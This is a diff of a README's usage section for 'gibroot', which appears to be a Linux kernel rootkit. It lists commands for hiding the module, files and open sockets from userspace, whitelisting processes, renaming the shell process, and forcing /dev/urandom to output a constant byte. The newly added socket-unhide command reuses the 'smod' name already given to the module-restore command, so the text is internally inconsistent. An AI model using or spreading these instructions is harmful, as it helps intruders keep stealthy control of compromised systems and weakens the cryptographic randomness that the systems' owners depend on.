@@ -60,6 +60,7 @@ to restore original shell priveliges, use
 ```
 gibroot unroot
 ```
+<br />
 
 to hide the kernel module from userspace, use
 ```
@@ -71,46 +72,64 @@ to restore the kernel module's visibility, use
 gibroot smod
 ```
 
+<br />
+
 to hide a file(s) or directory(s), use
 ```
 gibroot hide [file(s)]
 ```
-
 to unhide files, use
 ```
 gibroot show [file(s)]
 ```
+
+<br />
 
 to look at what files are being hidden, use
 ```
 cat /proc/hidden_files
 ```
 
+<br />
+
 to compromise /dev/urandom so it always writes 0x20, use
 ```
 gibroot urand
 ```
 
+<br />
+
 to whitelist processes and users from file hiding, use
 ```
 gibroot wadd [TYPE] [NAME/ID]
 ```
-supported types are PROCNAME,PID,UID,GID
-
-<br />
-
 to remove an entry from the whitelist, use
 ```
 gibroot wrem [TYPE] [NAME/ID]
 ```
-
 to view the entries in the whitelist, use
 ```
 cat /proc/whitelist
 ```
+supported types for the whitelist are PROCNAME,PID,UID,GID
+<br />
 
 to change the name of your bash process to something else, use
 ```
 gibroot newname [NAME]
 ```
 names of up to 16 characters are allowed (max length of comm field in a task struct)
+
+<br />
+
+to hide open sockets from userspace, use
+```
+gibroot hmod [TYPE] [STYPE] [PORT]
+```
+to unhide open sockets, use
+```
+gibroot smod [TYPE] [STYPE] [PORT]
+```
+supported types for the blacklist are LOCAL, SOURCE, and DEST
+
+supported stypes for the blacklist are STREAM, DGRAM, RAW, RDM, SEQPACKET, DCCP, and PACKET
